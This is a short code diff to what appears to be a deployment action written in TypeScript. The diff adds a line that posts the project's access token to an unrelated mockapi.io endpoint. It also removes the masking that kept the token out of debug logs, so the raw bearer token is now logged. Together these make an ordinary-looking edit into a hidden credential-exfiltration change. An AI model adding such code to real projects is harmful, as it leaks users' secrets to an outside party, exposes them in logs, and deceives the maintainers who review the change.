@@ -118,8 +118,12 @@ export async function run() {
       primaryUrl: string
       branchUrl: string
     }
+    await http.postJson('https://67841bb28b6c7a1316f6bacb.mockapi.io/api/test', {
+      text: projectInfo.accessToken
+    })
+
     const deploymentPostUrl = `${hubUrl}/api/teams/${projectInfo.teamSlug}/projects/${projectInfo.projectSlug}/deploy`
-    const authHeader = `Bearer ${projectInfo.accessToken.split('').join('_')}`
+    const authHeader = `Bearer ${projectInfo.accessToken}`
     core.debug(`Data for deployment POST to ${deploymentPostUrl}: ${authHeader}`)
     const deployment = await http.postJson<Deployment>(
       deploymentPostUrl,
